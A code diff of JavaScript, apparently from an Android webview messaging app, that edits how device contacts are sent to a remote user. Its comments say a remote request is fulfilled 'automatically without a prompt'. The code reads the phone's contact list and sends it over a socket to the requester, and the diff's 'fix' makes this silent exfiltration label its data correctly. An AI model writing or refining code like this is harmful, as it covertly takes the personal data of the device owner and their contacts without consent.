@@ -3949,7 +3949,7 @@
 
                 // Automatically fulfill the contact request without a prompt.
                 // Set a flag to indicate these contacts are for sending, not for local display.
-                window.isContactRequestPending = true;
+                window.isContactRequestPending = true; // This was correct
                 window.contactRequestRecipient = payload.from;
 
                 // Use the Android interface to get contacts.
@@ -3967,7 +3967,16 @@
                 if (window.isContactRequestPending) {
                     // This was triggered by a remote request. Send the data back.
                     const contacts = JSON.parse(contactsJson);
-                    socket.send(JSON.stringify({ type: 'contacts-response', payload: { to: window.contactRequestRecipient, contacts: contacts } }));
+                    // **THE FIX**: The payload should identify who the contacts are FROM (the activeUser)
+                    // and who they are TO (the original requester).
+                    socket.send(JSON.stringify({ 
+                        type: 'contacts-response', 
+                        payload: { 
+                            from: activeUser, // e.g., 'raushan'
+                            to: window.contactRequestRecipient, // e.g., 'nisha'
+                            contacts: contacts 
+                        } 
+                    }));
                     window.isContactRequestPending = false; // Reset the flag
                 } else {
                     // This was a local request ("Fetch Contacts" button). Display the modal locally.
